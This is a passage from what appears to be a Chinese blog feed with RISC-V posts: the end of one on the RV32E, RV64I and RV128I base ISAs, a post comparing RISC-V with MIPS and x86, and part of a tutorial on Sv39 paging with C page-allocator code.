机器中用户可见的整个体系结构状态。RV32I 指令都出现在 RV32E 中，它们的行为是相同的，当然访问不存在的寄存器 <code>x16</code> - <code>x31</code> 会导致异常。不过，上一节中提到的性能计数器 CSR 在 RV32E 中是可选的。</p><p>由于 RV32E 仅用于嵌入式的场景，它并不需要承载功能完整的操作系统。因此，虽然 RV32E 与 RV32I 不兼容 ABI，但也不必担心在 RV32 的软件生态系统中出现不友好的情况。</p><h2 id="RV64I">RV64I</h2><p>对于很多应用程序来说，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup></mrow><annotation encoding="application/x-tex">2^{32}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span></span></span></span> 个字节的可寻址内存是不够的。2015 年，大型服务器拥有多达 64 TiB 的DRAM，需要 46 位才能完全寻址。甚至一些手机的内存也超过了 4 GiB。因此，尽管 RV32I 适用于大多数的小型系统，但其有限的地址空间已无法满足许多系统。RV64I 在其基础上解决了地址空间不足的问题。</p><p>如下图所示，RV64I 的用户可见状态与 RV32I 非常相似：它只在整数寄存器和 <code>PC</code> 的位宽上都增加了一倍，达到 64 位。同样，RV32I 指令与 RV64I 对应的指令有相同的功能，当然 RV64I 能在 64 位寄存器上操作。除此之外，RV64I 提供了 12 条新的指令。</p><center>    <img src="/img/RV64I_reg.png" /></center><p>虽然整数算术通常操作寄存器的所有位，特别是在处理地址时，但对 sub-word 的计算也很常见。这种效果在 64 位中得到了放大，因为 Java 和 C 中 <code>int</code> 等数据类型仍然保持 32 位的宽度。为了在 32 位的代码上保持合理的性能，RV64I 添加了几条运算指令（图中前 9 条指令），它们对整数的低 32 位进行运算，并得到 32 位的结果，最后符号扩展到 64 位。</p><center>   <img src="/img/RV64I.png" /></center><p>在寄存器中保持 32 位数据符号扩展，可以在 C 类型 <code>int</code> 和 <code>unsigned int</code> 之间，以及 <code>int</code> 和 <code>long</code> 之间进行几乎无代价的强制类型转换。现有的分支指令在有符号/无符号的情况下都可以自动进行正常操作。</p><p>还有三条新的内存访问指令：LWU load 32 位的字，并将结果零扩展到 64 位。LD 和 SD load/store 64 位的双字。</p><h2 id="RV128I">RV128I</h2><p>在 1976 年，DEC 的两位设计师 Gordon Bell 和 Bill Strecker ，他们在 16 位 PDP-11 架构设计上获得了巨大的成功，敏锐地观察到，“在计算机设计中只有一个错误是难以纠正的——没有足够的地址空间用于内存寻址和内存管理“。PDP 的 <em>Virtual Address eXtension</em> ，说 VAX 可能更多人会知道，几乎将 PDP 全部设计了一遍：因为 PDP-11 的操作码已经用完了，因此在原有基础上修修补补不可能支持 32 位的地址空间。</p><p>为了避开这一设计错误，我们有意识地为 128 位地址空间 RV128I 保留了很多 RISC-V 的编码空间。虽然我们预计 64 位的地址空间在未来几十年对几乎所有的计算设备来说都是足够的，但 128 位的地址空间已经有了合理的应用，包括单地址空间操作系统。截至撰写本文时（2016），速度最快的超级计算机“天河 2 号”拥有 1.3 PiB 的内存，寻址需要 51 位。按照 TOP500 冠军的内存容量的历史增长率（每年约 70%），64 位地址空间将会在大约 20 年内耗尽。就从其全局可寻址的方面来看，我们认为扁平可寻址性是最好的方法； RV128I 提供了一个很有前途的解决方案。</p><p>RV128I 对 RV64I 的扩展类似于 RV64I 对 RV32I 的扩展：整数寄存器的位宽加倍；增加新的 load store 指令；基本的算术运算的操作对象变为 128 位。为了在 64 位数据上保持合理的性能，添加了只处理低 64 位的新的算术操作。下图总结了 RV128I 中的新指令。</p><center>    <img src="/img/RV128I.png" /></center><h2 id="总结">总结</h2><p>RISC-V 的基础 ISAs 实现起来很简单，也很直接，但足够完整，能支持现代软件堆栈。基础 ISA 设计避免了为简单或复杂的微体系结构增加不合理的复杂的设计负担；基础 ISA 在设计时考虑到了译码、立即数扩展、关键路径等一系列电路实现中的效率，使得实现更有能效；RISC-V 充分考虑到了 PIC 的重要性，并丢弃了提升很小但完全不合算的设计方案（比如，有条件移动、预测、延迟槽等）；同时，RISC-V 为了更好地提高嵌入式领域/高性能领域的性能或者能效，设计了 RV32E 和 RV64I 甚至 RV128I ，并提供了各种标准扩展；RISC-V 留给了未来非常充裕的编码空间，给自定义的扩展指令集非常充分的选择；</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
      <tag>RV32I</tag>
      
      <tag>RV64I</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Why RISC-V ?</title>
    <link href="/2020/09/15/2020-9-15-WHY%20RISC-V/"/>
    <url>/2020/09/15/2020-9-15-WHY%20RISC-V/</url>
    
    <content type="html"><![CDATA[<h1>WHY RISC-V ?</h1><p>读 <a href="https://people.eecs.berkeley.edu/~krste/papers/EECS-2016-1.pdf">Design of the RISC-V ISA</a> 论文后的总结与思考</p><h2 id="Introduction">Introduction</h2><p>软硬件接口，作为指令集架构 (ISA) 的重要组成部分，一直以来都是计算机系统中最重要的接口之一。然而相对于其他计算机系统中的接口，所有流行的 ISAs 都是商业且私有的 (Spring 2016)。在这篇论文中，作者 Andrew Shell Waterman 等人详细介绍了 RISC-V 体系结构。RISC-V 是一个免费且开放的 ISA。设计人员回顾三十几年来体系结构的发展，充分吸取经验教训，在原始的精简指令集计算机（RISC）体系结构上进行了构建和改进，从而构造为具有各种可选扩展的小型基础 ISA，并将其统一称之为 RISC-V。RISC-V 基本的 ISA 非常简单，因此很适合于研究和教育，但又足够完整，足以成为便宜的低功耗嵌入式设备的 ISA，而可选扩展对其的补充，使得 RISC-V 可用于通用和高性能计算。</p><p>在 RISC-V 还未问世之前，所有流行的 ISAs 都是专有标准。当然，这些国际标准化组织用知识产权来保护自己是无可厚非的，但保持标准的封闭会阻碍创新，并人为地抬高微处理器的成本。因此在 2010 年，Yunsup Lee 和  David Patterson 等人设计了一种完全自由开放的、基于 RISC 体系结构的指令集体系结构 RISC-V 。起初，RISC-V 是用于教学与研究，且在设计中主要参考了 SPARC 和 MIPS 这两个 ISA 。</p><p>为何当初 David Patterson 等人不怕麻烦，要动手设计一个全新的 ISA 呢？RISC-V 与其他的 ISA 相比，其优点到底在哪里呢？</p><h2 id="Why-Develop-a-New-Instruction-Set">Why Develop a New Instruction Set ?</h2><p>这个问题是设计人员在设计 RISC-V 时被经常问到的。为什么要设计一个新的 ISA 呢？毕竟很多的商业 ISAs 非常受欢迎，充分利用好其中的一个都会减少很多“不必要”的劳动。对于设计人员来说，他们有两个主要的考量：</p><ul><li><strong>商业专利问题</strong>。所有流行的商业 ISA 都是专营的。其供应商销售 ISA 的实现——比如以 IP 核的形式等的利润非常可观。虽然他们并没有禁止使用 ISA 来进行学术活动，但的确，这行为阻止了科研人员对 ISA 的完全 RTL 实现与共享，也为成功的研究想法商业化设置了障碍。</li><li><strong>过于复杂的 ISA</strong> 。经过若干年的发展，流行的商业 ISA 都变得非常复杂，难以全部在硬件上实现。当然，我们可以实现其子集，但是，由于没有完全对整个 ISA 进行实现，未修改的软件就不能在上面运行，也破坏了 ISA 的完整性。</li></ul><p>即使如此，作者他们仍然仔细考虑了可能的 ISA 选项，但最终全部否决了它们 ┑(￣Д ￣)┍。鉴于篇幅原因和本人水平有限（仅熟悉 RISC-V 、MIPS 和 80x86 ）因此先翻译整理一下这两者的劣势。</p><h3 id="MIPS">MIPS</h3><p><a href="https://en.wikipedia.org/wiki/MIPS_architecture">MIPS</a> 指令集架构是一个典型的RISC ISA 。MIPS 的设计思想受到了 IBM 801 微机的深刻影响。MIPS 采用了通用寄存器下的 load-store 架构，且内存只允许被从寄存器中读出/写入的指令访问，算术运算只允许在寄存器上完成。这些设计有效地减少了硬件、流水线等设计的复杂度。</p><p>在原先的设计中，MIPS 的用户级指令集只有 58 条，可以非常简单地设计出一个单发射、顺序的流水线。然而经过 30 年的发展，它已经进化成了一个非常庞大的 ISA ，有约 400 条指令。虽然 MIPS-I 的简单微架构可以被学术架构者轻松掌握，ISA 有几个技术缺陷，使其对高性能实现不太有吸引力：</p><ul><li><strong>对五阶段流水、单发射、顺序流水线的过度优化</strong>。例如，Branch 和 jump 指令被延时了一周期，导致了超标量和超流水线设计复杂化。delayed branch 指令增加了代码数量，当空出的延时槽无法适当填充时，还会浪费了指令发射带宽。况且，即使对于经典的五阶段流水线，删除延迟槽并添加一个小的branch target buffer (BTB) 通常会带来更好的绝对性能和单位面积性能。但考虑到保持向后兼容性，分支延迟槽已经不太可能被删除了。</li><li><strong>对 PIC (position-independent code) 支持不足</strong>，因此动态链接也很不行。MIPS 的直接跳转指令是伪指令，且跳转偏移量不是相对于 PC 的，而是绝对值，因此在 PIC 中没有任何用处。在 PIC 中，MIPS 只能使用间接跳转指令，这有很大的开销——不论是代码数量还是性能损失 (The 2014 revision of MIPS has improved PC-relative addressing, but PC-relative function calls still generally take more than one instruction) 。</li><li><strong>16-bit wide 的立即数消耗大量的编码地址空间</strong>，只留下一小部分操作码空间用于ISA扩展。当 MIPS 架构师试图通过压缩指令编码来减少代码数量时，他们别无选择，只能创建第二种指令编码，并启用模式开关，因为他们无法将新指令放到原始编码空间中。</li><li><strong>乘法和除法运算使用了特殊的寄存器 lo 和 hi</strong>，这增加了上下文大小，代码数量和微体系结构的复杂度。</li><li>**MIPS 预先假设浮点处理单元是一个与主处理器分离的协处理器。**在整型寄存器和浮点寄存器文件之间移动时，会有一个 software-exposed 的延迟槽，这会影响性能。</li><li>在标准 ABI 层，<strong>2 个整型寄存器被保留给内核程序</strong> ($k0 和 $k1)，减少了用户程序可使用的寄存器数量。</li><li><strong>需要处理不对齐的 load/store 指令</strong>，消耗大量的操作码空间并且使实现复杂化。</li><li><strong>MIPS 架构缺失了整数的 compare&amp;branch 指令</strong>。受限于时代发展，设计师对时钟速率和 CPI 进行折中处理，在分支预测的出现和向静态CMOS逻辑迁移的今天看来，就不是很合适。</li></ul><p>抛开技术问题不提，MIPS 不适合用于许多场合，因为它是一个专有指令集。历史上，MIPS 的技术专利对非对齐的 load-store 指令已经阻止其他人完全实现 ISA 。虽然该专利已经过期，但没有他们的许可，对 MIPS 的兼容性可不能随便声称😓。</p><h3 id="SPARC">SPARC</h3><h3 id="Alpha">Alpha</h3><h3 id="ARMv7">ARMv7</h3><h3 id="ARMv8">ARMv8</h3><h3 id="OpenRISC">OpenRISC</h3><h3 id="80x86">80x86</h3><p>Intel 的 8086 体系架构已经有四十多年的历史了，它是笔记本、台式机、服务器等领域最受欢迎的体系架构了。在嵌入式领域之外，几乎所有流行的软件都已经移植到 x86 ，或干脆为 x86 开发。相信这也是大家接触最多、学得最多的 ISA 了。80x86 的成功原因非常复杂：</p><ul><li>在 IBM PC 诞生之初，这种架构的偶然发现的可用性</li><li>Intel 执着地专注于二进制兼容性</li><li>Intel 大胆的微架构实现</li><li>Intel 的尖端制造技术</li></ul><p>然而，ISA 的设计质量可不在其中之一🙂。在 1994 年，AMD 80x86 架构师 Mike Johnson 说过一句著名的话，“ x86 其实并没有那么复杂，它只是在很多地方不太讲道理”。现在看来，这句话看起来有点黑色幽默—— x86 已经变得既复杂又不讲道理了。x86 现有 (2015) 1300 条指令，无数的寻址模式，几十个专用寄存器，和多个地址转换方案。所以，不应该感到奇怪的是，AMD 的 K5 微体系结构中所有的 Intel 乱序执行引擎已经动态地将 x86 指令转换为一种更类似于 RISC 风格的内部格式。简单地来说，在 80x86 下又套了一层 RISC 指令。</p><p>再来看看它多么不讲道理：</p><ul><li><p><strong>ISA 不是典型的可虚拟化的</strong>。因为一些特权指令会在用户模式下 sliently fail ，而不是被 trapped 。VMware 的工程师们用复杂的动态二进制翻译软件解决了这个缺陷，这可是出了名的。</p><p>ISA 的指令长度是可变的，最长的指令有 15 个字节，然而数量较少的短操作码（可以明显降低代码规模的）已经被随意地使用了。例如，Intel 的 IA-32 作为 80x86 的 32 位化身，256 个 8 位操作码中有 6 个加速了二进制编码十进制数的操作——这些操作非常深奥，以至于 GNU 编译器甚至不发出这些指令😓。好在 x86-64 放弃了这个特别糟糕的东西，但对 8 位操作码空间的大量浪费仍然存在，包括检查已弃用的 x87 浮点单元中挂起的浮点异常的指令。</p></li><li><p><strong>ISA 的寄存器过少</strong>。32-bit 架构的 IA-32 只有 8 个 整数寄存器 (eax ebx ecx edx esi edi ebp esp) 。这导致堆栈溢出非常常见。为了减少流水线占用和数据缓存流量，最近 Intel 微体系结构使用了一个特殊功能单元来管理栈指针的值，并缓存堆栈的前几个字。</p><p>在认识到这一缺陷后，AMD 的 64-bit x86-64 将整数寄存器的数量增加了一倍，达到 16 个。即便如此，许多程序——尤其是那些从循环展开和软件流水等编译器优化中受益的程序，仍然面临着寄存器数量不足的压力。</p></li><li><p><strong>大多数寄存器在 ISA 中有特殊功能</strong>，这让寄存器数量不足的问题雪上加霜。例如，整数除法的两个源操作寄存器必须是 DX 和 AX 寄存器；移位运算中的移位量必须来自 CX 寄存器，当然 CX 寄存器还要用作字符串操作的循环变量；ESI 用作 load 寻址时的增量偏移，EDI 用作 store 寻址时的增量偏移。博主对这点深有体会，在本科学习微机原理写 x86 汇编语言时真是令人吐血。</p></li><li><p>更加糟糕的是，<strong>x86 的大多数指令是破坏性的</strong>——得出的结果往往会覆盖一个源寄存器。通常，为保存这一运算结果或者源操作数，往往需要加一个额外的移动指令。</p></li><li><p><strong>有些 ISA 的特性使得设计复杂</strong>，并且，这些复杂的设计并不能带来多少性能的提高，因为它们的考虑不周，导致编译器不敢做 aggressive 的优化。例如，x86 提供了一个有条件的 load 指令，但如果无条件的 load 会出现异常，却由<u>实现</u>来决定是否有条件版本也会出现异常。</p><p>认识到条件操作的低效率后，Intel 最近在一定程度上将比较指令和分支指令融合到内部 compare &amp; branch 操作中。</p></li></ul><p>这些 ISA 设计对静态代码的大小有很大的影响，这使得原本非常密集的指令编码完全消失：IA-32 只比固定宽度的 32-bit ARMv7 编码稍微密集一些，而 x86-64 则比 ARMv8 少一些。</p><p>撇开这些缺陷不谈，x86 编码的程序通常比 RISC 架构使用更少的<strong>动态指令</strong>（指程序实际运行时执行的指令数），因为 x86 可以将多个原始操作编码在一起。例如，C 语言中的表达式 <code>x[2] += 13</code> 在 MIPS 中需要:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">lw    r5, 8(r4);<br>addiu r5, r5, 13;<br>sw    r5, 8(r4);<br></code></pre></td></tr></table></figure><p>然而在 IA-32 中只需要 <code>addl 13, 8(eax)</code> 。这样的动态指令密度有其优点：减少了取指能量消耗。但增加了实现的复杂性。在本例中，常规流水线会出现两种结构冒险 (structural hazards)，因为指令会执行两次内存访问和两次加法。</p><p>最后，80x86 是一种专用指令集，敢于尝试实现 x86 微处理器与 Intel 竞争的架构师们可能会面临法律障碍：Intel 一直以来都是好打官司的，即使他们自己也面临着反垄断危险。</p><h2 id="总结">总结</h2><p>下图总结了之前提到的 ISA 中支持的特性。这些特性都是我们认为现代 ISA 应该重点关注的。所有 ISA 都至少缺少两个重要的技术特征。表现最好的 ARMv8 是一个私有标准😓。开放的 ISA —— SPARC 和 OpenRISC 缺少了太多重要的架构特性。除了有争议的 DEC Alpha 之外，所有 ISAs 都有可能极大增加实现复杂性，特别是对于高性能实现的复杂性的属性。</p><p><img src="/img/ISA.jpg" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
      <tag>MIPS</tag>
      
      <tag>x86</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V from Scratch 7</title>
    <link href="/2020/08/29/2020-8-29-riscv-from-scratch-7/"/>
    <url>/2020/08/29/2020-8-29-riscv-from-scratch-7/</url>
    
    <content type="html"><![CDATA[<h1>RISC-V from scratch 7：内存分页</h1><p>接上一篇<a href="https://dingfen.github.io/risc-v/2020/08/17/riscv-from-scratch-6.html">博客</a>，今天我们继续写 <em>RISC-V from scratch</em> 系列博客。原本我打算将该<a href="https://github.com/twilco/riscv-from-scratch">英文系列</a>全部翻译成中文，但原作者貌似没有把这一系列完成就咕咕了。为了将工作继续下去，最终完成一个基于 RISC-V 的迷你小内核。我将这些实验继续做下去，并将自己的实践内容和想法写在这里，与大家分享探讨。</p><h2 id="往期回顾">往期回顾</h2><p>欢迎再次来到 <em>RISC-V from scratch</em> ，先快速回顾一下我们之前做过的内容，为实现时钟中断，我费了很大的力气学习了 RISC-V 机器模式，又简单了解了中断的概念，我们还在 UART 驱动程序的基础上实现了 <code>printf</code> 等工具函数，在机器模式、监管者模式下实现了时钟中断，最终我们得到的实验效果是，我们的小内核可以定时地跟我们说  hello 。</p><p>当然，实现时钟中断的最终目的不是让它定时地和我们说你好，而是为了进程调度——时间片。这是我在第六章结尾挖下的坑，然而在后续实验中我发现这一想法太过激进，一下子难以实现。在实现进程之前，我们总得把内存进行分页，好让各个进程的内存相互独立，然后才能有多个进程，才会有进程调度吧😅。</p><h2 id="搭建环境"><a href="https://dingfen.github.io/2020/07/24/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">搭建环境</a></h2><p>如果你还未看本系列博客的第一部分，没有安装 <code>riscv-qemu</code> 和 RISC-V 工具链，那么赶紧点击上面标题的链接，跳转到 <a href="https://twilco.github.io/riscv-from-scratch/2019/03/10/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">“QEMU and RISC-V toolchain setup”</a> 。</p><h2 id="内存管理的预备知识">内存管理的预备知识</h2><p>不得不承认内存分页与管理是一门很大的学问。博主学习了 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V 下的分页机制</a>，也细读了 <a href="http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 中文手册</a>，又参考了两篇优质的英文博客 <a href="https://osblog.stephenmarz.com/ch3.html">RISC-V OS using Rust chapter 3.1</a> 和 <a href="https://osblog.stephenmarz.com/ch3.2.html">RISC-V OS using Rust chapter 3.2</a> 。再加上自己总结梳理的 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a>，对整体的理论知识做了个梳理，才算是懂个大概😅。</p><p>当我们启动小内核时，代码和数据等所有东西都会被装载到 <code>virt</code> 机器的内存中，我们可以使用 <code>riscv64-unknown-elf-nm</code> 来查看我们程序中定义的符号、函数等位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ riscv64-unknown-elf-nm build/a.out<br>0000000080000d78 B __bss_end<br>0000000080000d68 R __bss_start<br>000000008000013c t flushTLB<br>00000000800002f2 T get_pagenum<br>0000000080000d40 R __global_pointer$<br>...<br></code></pre></td></tr></table></figure><p>小内核严格遵循我们的要求（确切地说是链接器脚本地要求）将代码放在数据段前面。这样的安排在刚开始时确实没啥问题，但如果有多个进程开始执行任务，而数据全部存放在一起的话，那么稍有不慎就会影响其他进程的运行方式。为了让我们的小内核支持类 Unix 操作系统，也为了更好的内存保护，保证进程运行空间的独立性，我们需要良好的内存管理。</p><h3 id="分页">分页</h3><p>如果各位不太明白什么是内存分页，那么<a href="https://www.jianshu.com/p/3558942fe14f">分页机制图文详解</a>会给你一个详细的入门介绍，只不过是 x86-64 架构的。而关于 RISC-V 的内存分页机制，以及 <code>satp</code> 寄存器在其中所起的重要作用，我在 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a>介绍的非常多了，当然也有很多不足甚至错误的地方，也恳请指出。</p><p>总的来说，内存分页就是将内存划分为固定大小的页，在低特权模式下，地址（包括 load 和 store 的有效地址和 PC 中的地址）都是虚拟地址，访问内存时必须被转换为真正的物理地址，具体转换方式是通过遍历页表实现的。因而内存分页制度的关键，在于设计并管理虚拟页和物理页的对应关系，即页表的设计。</p><h3 id="Sv39">Sv39</h3><p>RISC-V 的分页方案以 SvX 的模式命名，其中 X 是以位为单位的虚拟地址的长度，Sv39 指的就是虚拟地址长度为 39 位。我们的内核是基于 RV64 的，简单起见，我打算使用 <strong>Sv39</strong> 分页模式，因此我先重点介绍一下 Sv39 分页模式。事实上，Sv39 与 在 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a>介绍的 Sv32 样式基本没变，因此我就简单说一下哈。</p><p>为了方便解释，我画了如下示意图：</p><span id="Sv39" /><center><img src="/img/Sv39.png" /></center><ol><li><p>从 <code>satp</code> 寄存器中取出 44-bit 的根目录地址，乘以 PAGESIZE (4 KiB) 后，得到 3 级页表地址。</p></li><li><p>取出相对应的 VPN[i]，根据 VPN[i] 的值决定 PPN[i] 的页表偏移位置。</p></li><li><p>将得到的 56-bit 的 PPN[i] 取出，乘以 PAGESIZE (4 KiB) 后，得到 2 级页表地址，如此往复，直到遇到了叶 PTE。</p></li><li><p>物理地址的偏移量应等于虚拟地址的偏移量。</p><p>注意到：PPN[2] 的长度有 26 位，而整个物理地址的总长度不是 64 位，而是 56 位，使用零扩展了多余的位空间。</p></li></ol><p>上面的这张示意图非常重要，代码实现时可不能没有它；我们提到的 4 点在代码实现时也需要注意。</p><h3 id="到底要做什么">到底要做什么</h3><p>在介绍完分页和 RISC-V 的 Sv39 分页机制后，内存分页的理论知识其实就差不多学完了。然而，就如同大学的课程一样，就算认真学完了，你还是不知道具体该怎么做🐶。其中很大的原因，其实是我们不知道该做什么。因此，我先梳理一下在内存分页中，我们的小内核应该：</p><ul><li>决定何时启动内存分页</li><li>决定使用何种内存分页机制</li><li>决定如何管理页块</li><li>决定页表、进程（用户态、内核态）的内存分布</li><li>决定某些特殊的物理地址的虚拟地址</li><li>决定如何处理页错误</li></ul><p>我们的小内核不应该做：</p><ul><li>访问虚拟地址时转换为物理地址</li><li>快表 (TLB) 的管理</li></ul><h2 id="数据结构设计">数据结构设计</h2><p>好了，终于准备完成。万事俱备，只欠东风，我们只差代码实现了。</p><h3 id="空闲页块的管理">空闲页块的管理</h3><p>内存+基于页的分配，意味着分配内存就是以页为单位。俗话说万事开头难，有时候我们必须把自己当作机器才能取得突破。假设你是一个机器，你被受命去拿出一个页的内存给某个进程，你的第一反应是什么？Well，当然是找一个空的页块丢给那个进程。</p><p>那么哪里有空的页块呢？哪些块已经被使用了，哪些块用完以后又被进程还回来了呢？我们需要一个空闲页块管理！许多操作系统都会使用链表来帮助它们管理空闲页块，这里也不例外。</p><p>链表的头指针指向第一个空闲的页块，然后第一个空闲的页块拿出 8 字节来指向第二个页块，然后第二个页块指向第三个……</p><span id="freelist" /><center>    <img src="/img/freelist.png" /></center><p>这是一个非常棒的做法，我们不需要额外空间（确切的说只要一个指针）就可以源源不断地从链表头部获得空闲块；而遇到回收的情况，也只需要将回收块放到链表头部，而它的代码表示也非常简洁：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FreePages</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FreePages</span> *<span class="hljs-title">next</span>;</span><br>&#125; FreePage_t;<br></code></pre></td></tr></table></figure><h3 id="页的分配与回收">页的分配与回收</h3><p>定义了上面的数据结构后，接下来就要考虑一下页的分配与回收问题了。根据<a href="#freelist">链表图示</a>，我们只需要从链表头部取出一个空闲页块，然后将链表头指针后移动就可以了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">kalloc</span><span class="hljs-params">()</span> &#123;<br>    FreePage_t *pt = kmem;<br>    <span class="hljs-keyword">if</span> (kmem) &#123;<br>        kmem = kmem-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)pt;<br>&#125;<br></code></pre></td></tr></table></figure><p>回收的动作也相似，将要回收的块放到链表头部，再让链表头指针前移。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span> &#123;<br>    FreePage_t *pt = (FreePage_t *)p;<br>    <span class="hljs-built_in">memset</span>(pt, <span class="hljs-number">0</span>, PAGESIZE);<br>    pt-&gt;next = kmem;<br>    kmem = pt;<br>&#125; <br></code></pre></td></tr></table></figure><span id="VAPA" /><h3 id="虚拟地址与物理地址">虚拟地址与物理地址</h3><p>我们还有一个问题没有解决，那就是页表！其实页表自身没有那么深奥，说到底就是一个数组而已。而且在 Sv39 下其长度不会超过 512 。既然是个数组，那么就定义一个指向 64 字节的指针吧🤣。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> uint64 *PageTable_t;<br><span class="hljs-comment">// 定义一个全局的页表</span><br>PageTable_t kernel_pagetable;<br></code></pre></td></tr></table></figure><p>我们之前刚刚实现完页的分配，那么我们就给 <code>kernel_pagetable</code> 页表分配一个页块吧。哦，在这之前，我们必须把空闲块全部用链表串起来。之所以倒序循环，是为了让第一个被分配的页的地址排在前面，不然感觉怪怪的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">FreePage_t *pt;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> *p = (<span class="hljs-type">char</span>*)KERNEND; p &gt;= (<span class="hljs-type">char</span>*)KERNBASE; p -= PAGESIZE) &#123;<br>    pt = (FreePage_t *)p;<br>    pt-&gt;next = kmem;<br>    kmem = pt;<br>&#125;<br>kernel_pagatable = (PageTable_t)kalloc();<br></code></pre></td></tr></table></figure><p>现在，就要对照着 <a href="#Sv39">Sv39 示意图</a>，开始慢慢实现虚拟地址映射到物理地址的代码了。<u>在给定虚拟地址 VA 和物理地址 PA ，要把它们映射起来，使得访问虚拟地址 VA 就是访问物理地址 PA 。</u></p><p>第 1 步，要将 <code>satp</code> 寄存器中的 PPN 转换为页表首地址，这需要我们将特定的值写入到 <code>satp</code> 寄存器中。参考下图，</p><center>    <img src="/img/satp.png" />    <img src="/img/satp_mode.png" /></center>RV64 中的 `satp` 寄存器末 44 位都是 PPN，而首 4 位确定 MODE 位。如之前所说，我使用 Sv39 分页机制，因此 MODE = 8，ASID 位我先暂时不处理，全部用 0 填充。那么问题来了，PPN 位应该是什么呢？我也不清楚，要不就先给个定值糊弄过去🤪？就让页表起始地址是 `KERNBASE = 0x80101000` 吧。<p>在清楚地知道 <code>satp</code> 寄存器和 <code>SFENCE.VMA</code> 的用法后，写出以下汇编代码。<u>特别注意到，当程序运行完下段汇编代码后，分页就会开启，之后的地址全都是虚拟地址了。因此，这些汇编代码必须在所有准备工作完成后才能执行。</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">csrw satp, (8L &lt;&lt; 60) | (KERNBASE &gt;&gt; 12)<br>sfence.vma zero, zero<br></code></pre></td></tr></table></figure><p>第 2 步，从虚拟地址中提取出 VPN[i] ，当虚拟地址为 VA 时，对其进行相应的移位操作，就可以得到偏移量了。具体的函数实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_pagenum</span><span class="hljs-params">(<span class="hljs-type">int</span> level, uint64 va)</span> &#123;<br>    <span class="hljs-type">int</span> shift = PAGEOFF + level * <span class="hljs-number">9</span>;<br>    <span class="hljs-type">int</span> mask = <span class="hljs-number">0x1ff</span>;<br>    <span class="hljs-keyword">return</span> ((va &gt;&gt; shift) &amp; mask);<br>&#125;<br></code></pre></td></tr></table></figure><p>第 3 步，在访问页表并得到对应的 PTE 后，首先要判断：1）是否有效。2）是否为叶 PTE。3）是否有权限访问。然后根据  <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a>和 <a href="https://github.com/riscv/riscv-isa-manual/releases/download/draft-20200825-bb55379/riscv-privileged.pdf">RISC-V privileged ISA manual</a> 的具体要求，<a 